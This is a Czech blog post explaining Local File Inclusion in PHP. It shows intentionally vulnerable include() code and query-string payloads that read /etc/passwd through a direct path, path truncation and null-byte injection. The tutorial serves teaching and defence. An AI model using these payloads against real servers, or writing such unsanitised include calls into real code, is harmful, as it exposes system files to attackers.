---
layout: post
author: Tomáš Matějíček
title: "LFI - Local File Inclusion"
date: 2020-10-26
tags: LFI PHP
---

Zranitelnost File Inclusion umožňuje utočníkovi začlenit do zpracování skriptu požadovaný soubor a tím ovlivnit běh aplikace. Tato zranitelnost obvykle vzniká neošetřeným uživatelským vstupem.

Ovlivnění běhu aplikace může mít tyto podoby:
 - Vypsání obsahu požadovaného souboru
 - Provádění kódu na webovém serveru
 - Spuštění kódu na straně klienta, jako je JavaScript, což může vést k dalším útokům, jako je Cross-site scripting (XSS)
 - Odepření služby (DoS)
 
### Scénář č. 1
Zranitelný kód:
```php
<?php include($_GET['stranka']); ?>
```
Vypsání obsahu passwd
```
?stranka=/etc/passwd
```

### Scénář č. 2
Zranitelný kód:
```php
<?php include($_GET['stranka'].".php"); ?>
```

**Vypsání obsahu passwd díky zranitelnosti Path Truncation (byla opravena ve verzi PHP 5.3.0)**
Zranitelnosti Path Truncation využívá toho, že starší verze PHP mají limit na délku cesty omezen na 4096 bytů a to co je navíc jednoduše oříznou.
```
?stranka=../../../../../../  [.....]  /../../../../../etc/passwd
```

**Vypsání obsahu passwd díky zranitelnosti Null Byte Injection (byla opravena ve verzi PHP 5.3.4)**
Zranitelnosti Null Byte Injection využívá toho, že starší verze PHP umožňují ukončit řetězec řídícím znakem null a to co je navíc jednoduše oříznou.
```
?stranka=/etc/passwd%00
```
